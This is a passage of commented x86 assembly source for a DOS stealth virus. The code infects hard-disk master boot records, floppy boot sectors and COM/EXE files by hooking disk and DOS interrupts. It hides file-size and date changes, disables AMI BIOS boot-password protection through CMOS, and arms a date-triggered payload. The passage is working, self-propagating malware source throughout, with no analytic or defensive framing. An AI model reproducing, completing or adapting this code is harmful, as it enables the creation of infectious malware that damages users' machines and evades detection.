                   mov     word ptr ds:[(88h * 04h) + 02h],cs

                   mov     byte ptr ds:[04f4h],088h    ; change int86h to int88h
                                      ; in the virus int13h handler. this means,
                                      ; install the int13h handler that infects
                                      ; boots instead of the one waiting to hook
                                      ; int21h

                   mov     ah,04h                  ; get real time clock in bcd
                   int     1ah
                   cmp     cx,1996h                ; check if year < 1996
                   jb      no_act
                   ja      loccaz
                   cmp     dh,05h                  ; check month
                   jb      no_act
   loccaz:
                   xor     dx,sp
                   and     dx,0707h
                   cmp     dh,dl                   ; way random to see if is
                   jne     no_act                  ; gonna activate or not
                   inc     dl                      ; if so select one way to
                   mov     byte ptr cs:[payload_byte],dl   ; activate
   no_act:
                   mov     ax,5803h                ; set umb link state
           pop bx
                   xor     bh,bh                   ; restore the old state
                   int     87h
                   mov     ax,5801h                ; set mem alloc strategy
                   pop     bx                      ; to old one
                   int     87h
           pop es
           pop ds
                   popa
                   popf
                   inc     sp
                   inc     sp

                   db      0eah                    ; jmp far
   jmp_far_off     dw      02f6h                   ; this contains actual
                   dw      0000h                   ; call_res+21h block

   forget_call:
                   xor     ah,ah                   ; just do a disk reset
                   jmp     short rstatus_and_back
           nop

   virus_disk_handler:
                   cmp     ah,1                    ; see if calling a function
                   jbe     pass_to_old             ; we need to stealth such as
                   cmp     ah,7                    ; read, write, format
                   ja      pass_to_old
                   cmp     dx,80h                  ; check if on primary hd
                   jne     pass_to_old
           push    cx
                   db      83h,0e1h,0c0h           ; and cx,0ffc0h
           pop cx
                   jnz     pass_to_old             ; doing something on virus zone?
                   cmp     cl,1                    ; if not mbr it could delete
                   jne     forget_call             ; the virus, so forget it
                   cmp     ah,2                    ; if reading stealth, else
                   jne     forget_call             ; forget it
           push    cx
           push    ax
           and al,1
                   inc     cl                      ; read the original mbr
           inc cl
                   int     86h
           pop cx
           mov al,cl
           pop cx
                   jmp     short rstatus_and_back
           nop
   entry_88h:
                   mov     byte ptr cs:[check_by],dl       ; DL contains drive
           cmp dl,1
                   jb      floppy_a                        ; 0 then floppy A:
                   jz      floppy_b                        ; 1 then floppy B:
                   jmp     short virus_disk_handler        ; else a hard disk
   pass_to_old:
                   int     86h
   rstatus_and_back:
                   pushf
           push    ax
                   cmp     byte ptr cs:[check_by],1        ; contains disk drive
                   jb      floppy_a_ret
                   jz      floppy_b_ret
   return_13h:
           pop ax
                   popf
                   retf    2

   ;   status words
   ; value_ax2 is for floppy B:, value_ax1 is for floppy A:, while value_ax0 is
   ; common temporary for both.
   ; the value of this status word is:
   ;   high byte:  00 - floppy is not infected
   ;               01 - floppy is infected
   ;   low  byte:  00 - floppy has not been checked yet
   ;               01 - floppy has been checked
   ; this way the virus won't be checking each time all the things and, when
   ; needed, will stealth faster. of course this status words are reset each
   ; time a disk change is deteced.
   ;

   floppy_b_ret:
                   db      0b8h                            ; mov ax,
   value_ax0       dw      101h                            ; update floppy_b status
                   mov     word ptr cs:[value_ax2],ax      ; with the temp one
                   jmp     short return_13h
   floppy_a_ret:
                   mov     ax,word ptr cs:[value_ax0]      ; update floppy_a status
                   mov     word ptr cs:[value_ax1],ax      ; word with the temp one
                   jmp     short return_13h
   floppy_a:
           push    ax
                   db      0b8h                    ; mov ax, floppy_a status word
   value_ax1       dw      00h
                   jmp     short check_routine
           nop
   reset_status:
                   mov     byte ptr cs:[value_ax0],0       ; reset status
                   jmp     short pass_to_old               ; and go back
   floppy_b:
           push    ax
                   db      0b8h                    ; mov ax, floppy_b status word
   value_ax2       dw      00h
   check_routine:
                   mov     word ptr cs:[value_ax0],ax
                   mov     ah,16h                  ; detect disk change
                   int     86h                     ; int13h
           pop ax
                   jc      reset_status            ; if disk changed, then reset
                                                   ; the status and continue
                   cmp     ah,2                    ; interesting function?
                   jb      pass_to_old             ; (2 read, 3 write)
           cmp ah,4
                   jae     check_higher_fu
                   cmp     ch,51h                  ; triing to read virus body
                   je      stop_extra              ; on extra tracks?
                   or      dh,dh                   ; see if pointing to floppy
                   jnz     exit_fchecks            ; boot sector
                   cmp     cx,1
                   jne     exit_fchecks
                   cmp     byte ptr cs:[value_ax0],1
                   je      f_already_checked
                   cmp     ah,3                    ; writing to floppy boot? leave
                   je      exit_fchecks            ; them write then...

                   pusha
                   push    es
                   push    ds
                   call    check_nfect             ; check if infected
                   jb      ess_bel
                   call    infect_floppy           ; if not infect
                   jnb     ess_bel
                   mov     byte ptr ds:[value_ax0 + 1],0   ; mark as not infected
                   jmp     short ess_bel2
                   nop
   ess_bel:
                   mov     byte ptr ds:[value_ax0 + 1],1   ; this marks that an
                                                           ; infected floppy is in
   ess_bel2:
                   mov     byte ptr ds:[value_ax0],1       ; mark floppy as checked
                   pop     ds
                   pop     es
                   popa

   f_already_checked:
                   cmp     byte ptr cs:[value_ax0 + 1],1   ; is/was floppy infected
                   jne     exit_fchecks            ; if not, don't stealth

                   cmp     ah,2
                   je      read_fbs_stealth
           push    cx
                   mov     cx,5101h                ; if was writing then update
                   and     al,1                    ; the changes to saved boot
                   int     86h                     ; sector
                   jmp     short work_exit
           nop
   read_fbs_stealth:
                   int     86h                     ; execute requested read
           push    cx
           push    ax
                   pushf
                   mov     ax,201h                 ; but then read also the
                   mov     cx,5101h                ; saved original boot sector
                   int     86h
                   popf
           pop ax
   work_exit:
           pop cx
                   jmp     rstatus_and_back
   check_higher_fu:
                   cmp     ah,5                            ; triing to format?
                   jne     exit_fchecks
                   mov     byte ptr cs:[value_ax0],0       ; if formatting reset
   exit_fchecks:                                           ; status at all
                   jmp     pass_to_old
   stop_extra:
                   xor     ah,ah
                   jmp     rstatus_and_back

   check_nfect:
                   call    seg_bx_tspace
           mov cx,2

   do_read_mbr:
           push    cx
                   mov     ax,201h                 ; read MBR
           mov cl,al
           mov dh,0
                   int     86h                     ; orig int13h
           pop cx
                   loop    do_read_mbr             ; twice so we are sure it's
                   jc      bad_exit                ; there. exit on error

                   cmp     dl,80h                  ; on hd? if not no pt check
                   jb      check_name
                   mov     si,(offset temp_memory + 1beh - 10h)
                   mov     cx,4                    ; on partition table

   pt_search:
                   add     si,10h                  ; on next partition entry
                   cmp     byte ptr [si],80h       ; is bootable?
                   jne     next_ptentry
                   mov     al,byte ptr [si+4]      ; os code
                   dec     al                      ; ok if dos w/12bit fat
                   jz      check_name
                   cmp     al,3                    ; ok for dos < 32mb
                   jb      bad_exit                ; extended dos
                   cmp     al,5                    ; and dos > 32mb
                   jg      bad_exit
                   jmp     short check_name
           nop
   next_ptentry:
                   loop    pt_search

   bad_exit:
                   stc                             ; carry means error
           retn
   check_name:
                   mov     si,offset virus_name
                   mov     di,(offset temp_memory + 100h) ; where the name
                   mov     cx,5                           ; should stay in boot
                   cld
                   repe    cmpsb                   ; see if already infected
                   jz      bad_exit                ; zero flag -> it is
                   clc
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   infect_mbr:
                   mov     al,0adh
                   out     70h,al
                   in      al,71h
                   push    ax

                   and     al,0bfh
                   out     71h,al

                   mov     al,34h                  ; ami shadowing and boot pwd
                   out     70h,al
                   in      al,71h
           push    ax
                   and     al,7fh                  ; disable it
                   out     71h,al

                   mov     ah,5                    ; store keystroke in kbd buffer
                   mov     cx,1579h                ; 'y'
                   int     16h

                   call    seg_bx_tspace
                   mov     ax,301h
                   mov     cx,3                    ; save old MBR to 0,0,3
           mov dx,80h
                   int     86h
                   jc      exit_mbrinfect

                   mov     di,offset temp_memory
                   mov     cx,100h                 ; some random bytes on the
                   rep     stosw                   ; background

                   mov     word ptr es:[bx + 1feh],0aa55h  ; valid boot marker

                   mov     di,bx
                   mov     si,offset generic_boot  ; copy generic boot part
                   mov     cx,(offset generic_boot_end - offset generic_boot)
                   rep     movsb

                   mov     si,offset mbr_part      ; and mbr booting part
                   mov     cx,(offset mbr_part_end - offset mbr_part)
                   rep     movsb

                   mov     di,(offset temp_memory + 100h)
                   mov     si,offset virus_name
           mov cl,5
                   rep     movsb                   ; copy virus signature

                   mov     ax,301h
           mov cx,1
                   int     86h                     ; write new enhanched MBR :)
                   jc      exit_mbrinfect

                   mov     cx,3                    ; virus on hd starts from 4
                   call    oligo_write_fbhd
                   clc

   exit_mbrinfect:
                   mov     al,34h                  ; ami shadowing and boot pwd
                   out     70h,al
           pop ax
                   out     71h,al                  ; restore previous status

                   mov     al,0adh
                   out     70h,al
           pop ax
                   out     71h,al                  ; restore this as well.
           retn

   infect_floppy:
                   push    00h
                   pop     es
                   les     bx,es:[1eh * 04h]       ; point ES:BX to diskette param
                   mov     ax,0a02h
                   mov     dh,50h
                   xchg    word ptr es:[bx+3],ax   ; set bytes per sector to 512h
                                                   ; and sector per track to 0ah
                   xchg    byte ptr es:[bx+7],dh   ; set gap lenght for format to
                                                   ; 50h, that is the one for 5'25
                   push    ax
                   push    bx
                   push    dx
                   push    es
                   call    seg_bx_tspace

                   mov     ax,509h                 ; format 9 extra sector
                   mov     bx,offset format_table  ; to format address field buf
                   mov     cx,5101h                ; starting track
                   xor     dh,dh
                   int     86h
                   jb      somdown

                   mov     ax,301h                 ; save original boot sector
                   mov     bx,offset temp_memory
                   int     86h
                   jb      somdown

                   mov     word ptr ds:[bx],5eebh          ; jmp short to offset
                                                           ; 60h in boot

                   mov     di,(offset temp_memory + 60h)   ; at offset 60h in boot
                   mov     si,offset generic_boot          ; first generic boot
                   mov     cx,(offset generic_boot_end - offset generic_boot)
                   rep     movsb

                   mov     si,offset floppy_part           ; then floppy part
                   mov     cx,(offset floppy_part_end - offset floppy_part)
                   rep     movsb

                   mov     di,(offset temp_memory + 100h)  ; put virus name as
                   mov     si,offset virus_name            ; marker too in boot
                   mov     cl,05h
                   rep     movsb

                   mov     ax,301h                 ; write new boot sector
                   mov     cx,1
                   int     86h
                   jb      somdown

                   mov     cx,5101h                ; where it will be placed
                   call    oligo_write_fbhd
   somdown:
                   pop     es
                   pop     dx
                   pop     bx
                   pop     ax
                   mov     word ptr es:[bx+3],ax   ; restore diskette parameters
                   mov     byte ptr es:[bx+7],dh
                   ret

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   oligo_write_fbhd:
   ; this setups the registers for writing to hd or floppy in the write_to_disk
   ; routine and then calls the routine that creates the decryptor and encrypts
   ; the virus body. after that the virus is written starting from the wanted
   ; sector (this is CX in input to this routine) + 1

                   mov     word ptr ds:[what_call],offset write_to_disk
                   mov     word ptr ds:[value_cx],cx
                   mov     word ptr ds:[value_dx],dx
                   mov     dx,offset real_start
                   call    oligo_algo
           retn


   ; sets CS=DS=ES and points BX to temporary space after virus body
   seg_bx_tspace:
           push    cs
           pop es
           push    cs
           pop ds
                   mov     bx,offset temp_memory
           retn


   close_file:
                   mov     ah,3eh                  ; close file
                   int     87h
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   chk_extsuch:
                   xor     si,si
                   call    get_sft
                   jc      bad_fileis_np
           cmp byte ptr es:[di+5],0
                   js      bad_fileis_np
                   cmp     byte ptr es:[di+10h],200d       ; file date check
                   pushf
                   call    check_ifclose                   ; is a close call?
                   jne     check_dotcom
                   test    byte ptr es:[di+2],3            ; on +2 open mode
                   je      bad_fileis                      ; no 011b, dos internal
                   and     byte ptr es:[di+2],0f8h
                   or      byte ptr es:[di+2],2            ; make it read-write
   check_dotcom:
                   cmp     word ptr es:[di+28h],'OC'       ; check if .COM
                   jne     check_dotexe
                   cmp     byte ptr es:[di+2ah],'M'
                   jne     bad_fileis
                   inc     si                              ; SI = 1 for coms
                   jmp     short good_exitchk
           nop
   check_dotexe:
                   cmp     word ptr es:[di+28h],'XE'       ; check if .EXE
                   jne     bad_fileis
                   cmp     byte ptr es:[di+2ah],'E'
                   jne     bad_fileis
                   inc     si                              ; SI = 2 for exes
           inc si
   good_exitchk:
                   popf
           retn
   bad_fileis:
                   popf
   bad_fileis_np:
                   stc
           retn

   dont_correct_after:
                   jmp     back_inf_w24
   pre_21h_exit:
                   db      0b8h                    ; mov ax,
   func_21h        dw      4b00h                   ; stored called int21h func
           and ah,2
                   jnz     dont_correct_after      ; if function different than
                   pop     di                      ; 3dh and 6ch then just
                   pop     si                      ; restore int24h header and
                   pop     dx                      ; exit, else sft size
                   pop     cx                      ; stealth
           pop bx
           pop ax
           pop ds
           pop es
                   int     87h                     ; call original int21h
                   jc      error_21hl

                   pushf
           push    bx
           mov bx,ax
                   call    check_nostealth         ; if zip or backup running
                   jc      no_stealth_1            ; don't stealth
           push    es
           push    di
                   call    get_sft                 ; get file sft
                   or      byte ptr es:[di+6],4    ; mark in SFT that size has
                                                   ; already been stealthed using
                                                   ; unused bit
                   call    stlth_fsize_sft         ; stealth file size in sft
           pop di
           pop es
   no_stealth_1:
           pop bx
                   popf
   error_21hl:
                   call    change_24h
                   jmp     return_from_int
   exit_r_stealth:
                   int     87h                     ; execute the original int 21h
                   pushf
           push    ax
   exit_read_stealth:
           pop ax
                   popf
           pop si
           pop di
           pop es
                   jmp     return_from_int

   read_from_file:
           push    es
           push    di
           push    si
                   call    chk_extsuch             ; check if seems a file good to
                   jc      exit_r_stealth          ; infect by extension and such
                   or      si,si
                   jz      exit_r_stealth
                   call    check_nostealth         ; check if zip or backup running
                   jc      exit_r_stealth
                   test    byte ptr es:[di+6],4    ; has been size already stlthed
                   jnz     already_sft             ; before?
                   call    stlth_fsize_sft         ; if not stealth it
                   or      byte ptr es:[di+6],4    ; and sign as stlthed in sft
   already_sft:
                   les     di,dword ptr es:[di+15h]        ; current offset in file
                   mov     word ptr cs:[ax_setvalue],di
                   int     87h                     ; execute the read
                   pushf
           push    ax
                   jc      exit_read_stealth       ; exit if read unsucesfull
                   cmp     di,1ah                  ; if not reading the header then
                   jae     exit_read_stealth       ; np and we can exit

                   mov     ax,es                   ; ES is high word of offset in
                   or      ax,ax                   ; file. if <> 0 then it isn't
                   jnz     exit_read_stealth       ; on header for sure
                   jcxz    exit_read_stealth       ; if 0 bytes readed then exit
                                                   ; as well

   ; if we are here then the header of an infected file is going to be readed, so
   ; we must restore the original bytes
                   mov     ah,0dh                  ; disk reset
                   int     87h

                   call    get_sft
           push    es
                   les     ax,dword ptr es:[di+15h]        ; current off in file
           mov si,es
           pop es
                   push    ax                      ; save current offset on stack
           push    si
           push    bx
           push    es
                   les     ax,dword ptr es:[di+11h]        ; file size
                   mov     si,es                           ; SI:AX has filesize
           pop es
                   mov     bx,ax
                   and     ax,0fh                  ; calculate bytes been added
                   neg     al                      ; to make (lenght MOD 10h = 0)
           add al,10h
                   and     al,0fh
           add ax,bx
           cmp ax,bx
                   jae     n_adjust_lng
                   inc     si                      ; if < then obviously it was a
                                                   ; wrap around, so inc the higher
                                                   ; word
   n_adjust_lng:
           pop bx
                   add     word ptr es:[di+11h],virus_lenght
                   adc     word ptr es:[di+13h],0  ; add to stealthed size so
                   push    ds                      ; we can actually read the
                   push    cx                      ; virus
           push    dx
           push    ax
           push    si
           push    cs
           pop ds

                   mov     cx,si
           mov dx,ax
                   xor     al,al                   ; move to virus start
                   call    movefile

                   mov     ah,3fh                  ; read first 72h bytes of
                   mov     cx,72h                  ; virus, this is the decryptor
                   mov     dx,offset temp_memory
                   int     87h

                   push    bx
                   mov     cx,5                    ; decryption instruction is
                                                   ; the fifth block in the
                                                   ; decryptor
                   mov     bl,0fdh

   find_5_block:
           add bl,5
                   add     bl,[bx + (offset temp_memory - 1)]      ; jump through
                                                                   ; block jumps
                   loop    find_5_block

                   add     bx,dx                           ; add base
                   mov     ax,word ptr [bx]
                   not     ax                              ; method is not-ted
                   and     ah,0fch
                   mov     word ptr ds:[enc_ins_b],ax      ; decryption method
                   mov     al,byte ptr ds:[bx+2]
                   mov     byte ptr ds:[enc_val_b],al      ; decryption value
           pop bx
                   jmp     short preffo
   preffo:
                   xor     al,al
           pop cx
           pop dx
                   add     dx,offset original_file         ; file pointer to
                   adc     cx,0                    ; stored file bytes
                   call    movefile                ; move there

                   mov     ah,3fh                  ; read saved bytes from file
                   mov     cx,1ah                  ; 1ah bytes
                   mov     dx,offset original_file
                   int     87h
           mov si,dx
                   mov     cx,1ah

   decrypt_original:
   enc_ins_b       db      80h,34h                 ; decrypt original bytes of
   enc_val_b       db      0c0h                    ; file
           inc si
                   loop    decrypt_original

           pop dx
           pop cx
           pop ds
                   call    stlth_fsize_sft         ; stealth virus size in SFT

                   pop     ax
                   mov     es:[di+17h],ax                  ; restore current
                   pop     ax                              ; offset in file
           mov es:[di+15h],ax

                   push    ds
           push    cx
                   db      0b8h
   ax_setvalue     dw      1400h                   ; saved offset in file user
                                                   ; wanted to read from
                   mov     di,dx
           add di,ax
                   mov     si,offset original_file
                   add     si,ax
           push    ds
           pop es
           push    cs
           pop ds
                   mov     ax,1ah                  ; how many bytes virus changed
                   sub     ax,word ptr cs:[ax_setvalue]    ; calculate how many
                                                           ; we must stealth
                   cmp     cx,ax                   ; cx has number of bytes readed
                   jb      no_more_tr              ; if readed < how many to stlth
                   mov     cx,ax                   ; then proceed, else stealth all
   no_more_tr:                                     ; of them
                   cld
                   rep     movsb                   ; copy needed amount of original
                   pop     cx                      ; bytes there
           pop ds
                   jmp     exit_read_stealth
   back_j_old21h:
                   jmp     chain_old21h
                   jmp     return_from_int

   get_set_date:
           push    es
           push    si
           push    di
                   call    chk_extsuch             ; see if seems infectable
           pop di
           pop si
           pop es
                   jc      back_j_old21h
                   cmp     al,1                    ; just get/set file date func
                   ja      back_j_old21h
                   jc      isa_getdate
           push    dx
                   add     dh,200d                 ; add the virus 200 years when
                   int     87h                     ; setting date
           pop dx
                   jmp     return_from_int
   isa_getdate:
                   int     87h                     ; get date
                   pushf
                   sub     dh,200d                 ; and sub the 200 years
                   popf
                   jmp     return_from_int

   ff_fn_stealth:
   ; this is called at 11h/12h and 4eh/4fh functions of int21h
                   call    check_nostealth         ; if zip or backup running
                   jc      back_j_old21h           ; then don't stealth
           push    es
           push    bx
                   clc
                   int     87h                             ; execute the call
                   jc      exit_err_ff                     ; C if error (for 4e/4f)
                   or      al,al                           ; AL <> 0 if error
                   jnz     exit_err_ff                     ; (for 11h/12h)

                   push    ax
                   mov     ah,2fh                          ; get dta
                   int     87h

                   cmp     byte ptr cs:[func_21h + 1],12h  ; 21h fnct. 11h/12h?
           pop ax
           push    si
                   jbe     corr_off1112                    ; correct the offsets
                   add     bx,19h                          ; to size and date
                   mov     si,bx                           ; depending on the
                   inc     si                              ; function call
   correct_dta:
                   cmp     byte ptr es:[bx],200d           ; check date if file
                   jb      notinfected                     ; is infected
                   sub     byte ptr es:[bx],200d           ; sub years
                   sub     word ptr es:[si],virus_lenght   ; and virus size
           sbb word ptr es:[si+2],0
   notinfected:
           pop si
                   xor     al,al                   ; anyway make it succesfull
   exit_err_ff:
                   pop     bx                      ; restore and return back
           pop es
                   jmp     short return_from_int
           nop
   corr_off1112:
                   add     bx,21h                  ; offset to years for 11h/12h
           mov si,bx
                   add     si,3                    ; offset to file length
                   jmp     short correct_dta

   int21h_handler:
                   mov     word ptr cs:[func_21h],ax
                   pushf
                   call    check_payload

                   cmp     ah,4eh                  ; findfirst dta
                   je      ff_fn_stealth
                   cmp     ah,4fh                  ; findnext dta
                   je      ff_fn_stealth

                   cmp     ah,11h                  ; findfirst fcb
                   je      ff_fn_stealth
                   cmp     ah,12h                  ; findnext fcb
                   je      ff_fn_stealth

                   cmp     ah,3fh                  ; read from file
                   je      read_from_file_jj
                   cmp     ah,57h                  ; get/set file date
                   je      get_set_date_jj

                   cmp     ah,4bh                  ; exec
                   je      could_infect
                   cmp     ah,3dh                  ; open file
                   je      could_infect
                   cmp     ah,6ch                  ; extended open file
                   je      could_infect
                   cmp     ah,43h                  ; get/set file attrib
                   je      could_infect
                   cmp     ah,3eh                  ; close file
                   je      could_infect
   chain_old21h:
                   popf
                   db      0eah                    ; jmp far ptr
   old_int21h      dw      40F8h, 19h

   return_from_int:
           inc sp
           inc sp
                   retf    2

   get_set_date_jj:
                   jmp     get_set_date

   read_from_file_jj:
                   jmp     read_from_file
   exit_wcch:
                   jmp     bf_close_exit
   could_infect:
           push    es
           push    ds
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
                   cmp     ah,6ch                  ; extended open?
                   jne     not_ext_open
                   and     dl,2                    ; open/replace if exist?
                   jz      ok_extended             ; if not continue
                   jmp     back_inf
   infect_file:
                   mov     ax,3d00h                ; open file
                   int     87h
                   jc      not_opened_ext
                   call    chk_extsuch             ; check extension and if isn't
                   jnc     exit_wcch               ; already infected with years
                   call    close_file
                   jmp     back_inf_w24
   not_opened_ext:
                   jmp     back_inf_w24
   ok_extended:
           mov dx,si
   not_ext_open:
           push    cs
           pop es
           push    ds
                   xor     si,si
                   mov     ds,si                   ; to ivt
                   mov     di,offset the_24h
                   mov     si,24h*04h              ; to int24h handler
                   cld
                   cli
                   movsw                           ; save int24h handler
                   movsw
                   mov     word ptr [si-4],offset hnd_24h  ; and set virus one
                   mov     word ptr [si-2],cs              ; to virus segment
                   sti

                   pop     ds
                   cmp     ah,3eh                  ; close?
           mov ax,bx
                   jz      not_windoze

                   mov     word ptr cs:[fname_dx],dx
                   mov     word ptr cs:[fname_ds],ds
                   mov     ax,3d00h                ; open the file in r/o
                   int     87h
                   jc      not_opened_ext

                   mov     bx,ax
                   call    close_file
                   mov     ax,4300h                ; get attribs and save
                   int     87h
                   mov     word ptr cs:[file_attrib],cx

                   mov     ax,4301h
                   xor     cx,cx                   ; delete attribs
                   int     87h
                   jc      infect_file             ; error here? retry from start

                   mov     ax,3d02h                ; open for rw
                   int     87h

                   cmp     byte ptr cs:[func_21h + 1],4bh  ; was executing?
                   jne     not_windoze

                   mov     bx,ax
                   call    get_sft
                   cmp     word ptr es:[di+20h],'IW'       ; windows executing?
                   jne     not_windoze
                   cmp     word ptr es:[di+22h],' N'
                   jne     not_windoze
           push    bp
           mov bp,sp
                   mov     ds,word ptr [bp+10h]    ; on exec parameter block
                   mov     si,word ptr [bp+0ah]
           pop bp
                   lds     si,dword ptr [si+2]
                   xor     bx,bx
                   mov     bl,byte ptr [si]        ; lenght of cmdline
                   add     byte ptr [si],5         ; correct lenght of cmdline
           add si,bx
                   inc     si                      ; after original cmdline
                   mov     word ptr [si],'D/'      ; so append /D:FC + cr
                   mov     word ptr [si+2],'F:'
                   mov     word ptr [si+4],0d43h
   not_windoze:
           push    cs
           pop ds
                   mov     bx,ax                   ; file handle
                   mov     word ptr ds:[file_handle],ax
                   call    chk_extsuch
                   jnc     bf_close_exit
                   or      si,si
                   jz      bad_file_xit

                   mov     ax,5700h                ; get file time/date
                   int     87h
                   mov     word ptr ds:[file_time],cx      ; save time/date
                   mov     word ptr ds:[file_date],dx

                   call    check_fname

                   mov     ah,3fh                  ; read from file
                   mov     cx,1ch
                   mov     dx,offset original_file ; 1ch from file head
           mov di,dx
                   int     87h
                   jc      bad_file_xit

                   mov     al,2                    ; goto end of file
                   call    move_cxdx0              ; gives in DX:AX length

                   mov     cx,word ptr [di]        ; first two bytes
                   cmp     cx,'MZ'                 ; exe?
                   je      is_an_exe
                   cmp     cx,'ZM'                 ; exe?
                   je      is_an_exe
                   cmp     cx,'EL'
                   je      bad_file_xit
                   cmp     cx,'EN'
                   je      bad_file_xit
                   or      dx,dx                   ; > 64k is ok
                   jnz     bad_file_xit
                   cmp     ax,60000d               ; not 60000 > 64k bad for coms
                   ja      bad_file_xit
                   cmp     ax,1eh                  ; not too small even
                   jb      bad_file_xit
                   jmp     com_infect_part
   bad_file_xit:
                   jmp     closef_exit
   is_a_close2:
                   jmp     back_inf_w24
   bf_close_exit:
                   call    check_ifclose
                   jz      is_a_close2             ; close if needed and exit
                   call    close_file
                   jmp     pre_21h_exit
   is_an_exe:
                   push    ax
           push    dx
           mov cx,200h
           div cx          ; ax,dx rem=dx:ax/reg
                   cmp     word ptr [di+2],dx
           pop dx
           pop ax
                   jnz     bad_file_xit
                   cmp     word ptr [di+18h],40h   ; probable PE or NE
                   jae     bad_file_xit
                   cmp     byte ptr [di+1Ah],0     ; overlay
                   jne     bad_file_xit
           push    ax
           push    dx
                   mov     si,word ptr [di+8]      ; header paras
                   shl     si,04h                  ; to bytes
                   sub     ax,si                   ; DX:AX now image size
                   sbb     dx,0
                   call    align_file10h
                   push    dx
                   push    ax
                   push    di
                   mov     dx,offset real_start    ; from where to encrypt
                   mov     byte ptr cs:[com_or_exe],1
                   mov     word ptr ds:[what_call],offset write_to_file
                   call    oligo_algo
                   pop     di
                   pop     ax
                   pop     dx
                   shr     ax,4
                   shl     dx,0ch
                   or      dx,ax
                   xor     ax,ax
                   mov     word ptr ds:[di+14h],ax         ; new cs:ip
                   mov     word ptr ds:[di+16h],dx
                   adc     ah,14h
                   adc     al,dl
                   mov     word ptr ds:[di+10h],ax         ; new ss:sp
                   mov     word ptr ds:[di+0eh],dx
                   pop     dx
                   pop     ax

                   add     ax,virus_lenght
                   adc     dx,0
                   mov     cx,200h
                   div     cx
                   inc     ax
                   mov     word ptr ds:[di+02h],dx ; new lenght in 200h pages
                   mov     word ptr ds:[di+04h],ax ; and the modulus

                   call    movetostart             ; move to start of file
                   mov     cx,1ah                  ; header lenght to rewrite
                   mov     dx,di
                   jmp     short writehead
                   nop
   check_ifclose:
                   cmp     byte ptr cs:[func_21h + 1],3eh  ; was a close file?
           retn

   closef_exit:
                   call    check_ifclose           ; was a close function?
                   jz      back_inf_w24            ; if so jump
                   call    close_file              ; else close the file and
                   call    rest_attrib             ; restore file attributes
                   jmp     short back_inf_w24
           nop
   back_inf_w24:
                   call    change_24h
   back_inf:
           pop di
           pop si
           pop dx
           pop cx
           pop bx
           pop ax
           pop ds
           pop es
                   jmp     chain_old21h
   com_infect_part:
                   mov     byte ptr [com_or_exe],dl
                   call    align_file10h
           push    ax
                   add     ax,(offset real_start + 100h)   ; encrypted from
           mov dx,ax
                   mov     word ptr ds:[what_call],offset write_to_file
                   call    oligo_algo
                   call    movetostart
           pop cx
                   sub     cx,3                    ; - jmp lenght
                   mov     si,offset temp_memory
           mov dx,si
                   mov     byte ptr [si],0e8h      ; code the call to the virus
           inc si
                   mov     word ptr [si],cx
                   mov     cx,3                    ; three bytes to write
   writehead:
                   mov     ah,40h                  ; write
                   int     87h
                   jc      closef_exit
                   mov     ah,0dh                  ; disk reset
                   int     87h

                   add     word ptr ds:[file_date + 1],200d        ; add 200 years
                                                                   ; as marker
   ; seems buggy, but it works since the high byte is zero, anyway it should
   ; be            add     word ptr ds:[file_date],200d
   ; or            add     byte ptr ds:[file_date + 1],200d

                   call    check_ifclose
                   jne     not_close_func
                   call    rest_time                       ; if close just
                   jmp     pre_21h_exit                    ; restore time
   not_close_func:
                   call    close_file                      ; else close file
                   call    close_wtime                     ; and restore time
                   call    rest_attrib                     ; and attributes
                   jmp     pre_21h_exit

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   rest_attrib:
                   lds     dx,dword ptr cs:[fname_dx]      ; ds:dx = filename
                   mov     ax,4301h                ; chmod
                   db      0b9h                    ; mov cx,
   file_attrib     dw      20h
                   int     87h
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   close_wtime:
                   lds     dx,dword ptr cs:[fname_dx]      ; ds:dx = filename
                   mov     ax,3d00h                ; open in readonly
                   int     87h
           mov bx,ax
                   call    rest_time               ; restore time
                   call    close_file              ; and close again
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   rest_time:
                   mov     ax,5701h                ; set file date and time

                   db      0b9h                    ; mov cx,
   file_time       dw      1810h

                   db      0bah                    ; mov dx,
   file_date       dw      2397h

                   int     87h
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   align_file10h:
   ; on entry DX:AX lenght
   ; on exit DX:AX lenght aligned to 10h
                   mov     cx,ax
                   and     ax,0fh                  ; calculate bytes to make
                   neg     ax                      ; the file aligned to 10h
           add ax,10h
                   and     ax,0fh
                   mov     byte ptr cs:[value_cl],al       ; store that value
           add ax,cx
           adc dx,0
           push    ax
                   mov     ah,40h                  ; write the alignment
                   xor     ch,ch                   ; bytes
                   mov     cl,byte ptr cs:[value_cl]
                   int     87h
           pop ax
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   movetostart:
                   xor     al,al
   move_cxdx0:
                   xor     cx,cx
                   xor     dx,dx
   movefile:
                   mov     ah,42h                  ; lseek function
                   int     87h
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   get_sft:
           push    bx
           push    ax
                   mov     ax,1220h                ; get jft entry
                   int     2Fh
                   jc      error_sftjft

                   mov     ax,1216h                ; get sft entry
           mov bl,es:[di]
                   int     2Fh
                   jc      error_sftjft
                   clc
   error_sftjft:
           pop ax
           pop bx
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   stlth_fsize_sft:
                   sub     word ptr es:[di+11h],virus_lenght
